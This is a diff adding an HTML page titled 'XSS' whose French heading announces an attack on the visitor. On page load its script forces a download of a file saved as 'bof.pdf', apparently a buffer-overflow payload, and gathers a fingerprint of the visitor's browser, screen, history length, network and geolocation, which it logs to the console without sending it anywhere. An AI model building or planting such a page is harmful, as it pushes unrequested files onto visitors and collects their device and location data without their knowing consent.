@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>XSS</title>
+  </head>
+  <body>
+    <main>
+        <h1>Wola aujourd'hui je t'attaque</h1>
+        <p> </p>
+    </main>
+    <script>
+
+    window.onload = function() {
+        fetch("Haha.pdf")
+        .then(response => response.blob())
+        .then(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = "bof.pdf"; 
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url); 
+        })
+        .catch(error => console.error("Erreur de téléchargement :", error));
+        const userInfo = {
+            userAgent: navigator.userAgent,          // Navigateur et système d'exploitation
+            language: navigator.language,            // Langue préférée de l’utilisateur
+            platform: navigator.platform,            // Plateforme 
+            online: navigator.onLine,                // État de la connexion 
+
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            colorDepth: screen.colorDepth,           
+
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+
+            // Préférence du système (mode sombre)
+            prefersDarkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
+
+            // Longueur de l'historique de navigation
+            historyLength: history.length
+        };
+
+        // Informations sur la géolocalisation (avec consentement)
+        if (navigator.geolocation) {
+            console.log("test");
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    console.log(1);
+                    userInfo.latitude = position.coords.latitude;
+                    userInfo.longitude = position.coords.longitude;
+                    userInfo.accuracy = position.coords.accuracy;
+
+                    console.log("Informations de l'utilisateur avec géolocalisation :", userInfo);
+                },
+                (error) => {
+                    console.error("Géolocalisation refusée ou erreur:", error.message);
+                    console.log("Informations de l'utilisateur sans géolocalisation :", userInfo);
+                }
+            );
+        } else {
+            console.log("Géolocalisation non supportée. Informations de l'utilisateur :", userInfo);
+        }
+
+        // Informations sur la connexion réseau (si disponible)
+        if (navigator.connection) {
+            userInfo.connectionType = navigator.connection.effectiveType;
+            userInfo.downlink = navigator.connection.downlink;    // Vitesse estimée de téléchargement
+        } else {
+            userInfo.connectionType = "Non disponible";
+        }
+
+        console.log("Informations complètes de l'utilisateur :", userInfo);
+
+    };
+
+        
+    </script>
+  </body>
+</html>
